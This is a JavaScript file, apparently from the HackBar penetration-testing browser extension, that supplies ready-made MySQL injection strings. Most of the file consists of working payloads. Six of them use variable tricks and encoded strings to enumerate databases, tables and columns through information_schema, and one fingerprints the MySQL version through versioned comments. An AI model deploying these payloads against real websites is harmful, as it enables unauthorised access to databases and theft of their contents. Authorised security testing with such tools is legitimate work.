HackBar.VM = {

	VariableMethod: function (choice)	{
		var str = choice;
		switch (str){
			case 'VARIABLE METHODS1': txt = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
					break;
			case 'VARIABLE METHODS2': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.schemata)where(schema_name!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)and(@)in(@:=concat(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS3': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS4': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case 'VARIABLE METHODS5': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case 'VARIABLE METHODS6': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
// FIND IT

		case 'Find It': txt = "/*!60000 integer version=6<!*/ /*!50000 integer version=5<!*/ /*!40000 integer version=4<!*/ /*!30000 integer version=3<!*/  ' /*!60000 string version=6<!*/ /*!50000 string version=5<!*/ /*!40000 string version=4<!*/ /*!30000 string version=3<!*/";
					break;

		}
		hackBar.setSelectedText( txt );
	  }

}
